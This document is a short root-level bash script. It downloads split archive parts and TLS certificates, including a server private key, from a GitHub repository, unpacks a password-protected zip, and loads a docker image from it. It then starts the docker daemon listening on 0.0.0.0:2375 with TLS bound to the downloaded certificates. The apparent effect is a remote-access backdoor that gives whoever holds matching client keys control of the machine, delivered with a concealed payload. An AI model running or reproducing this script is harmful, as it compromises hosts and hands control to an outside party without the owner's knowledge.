#!/bin/bash
echo 1
mkdir /root/.docker
cd /root/.docker
wget https://raw.githubusercontent.com/fun1n/test/master/testaa
wget https://raw.githubusercontent.com/fun1n/test/master/testab
wget https://raw.githubusercontent.com/fun1n/test/master/testac
cat test* > t.zip
unzip -P 1qaz2wsx t.zip
apt-get install -y docker.io  
service docker stop
wget https://raw.githubusercontent.com/fun1n/test/master/server-cert.pem  -O /root/.docker/server-cert.pem
wget https://raw.githubusercontent.com/fun1n/test/master/ca.pem -O /root/.docker/ca.pem
wget https://raw.githubusercontent.com/fun1n/test/master/server-key.pem  -O /root/.docker/server-key.pem
setsid docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=0.0.0.0:2375 -H unix:///var/run/docker.sock &
docker load -i /root/.docker/test.tar
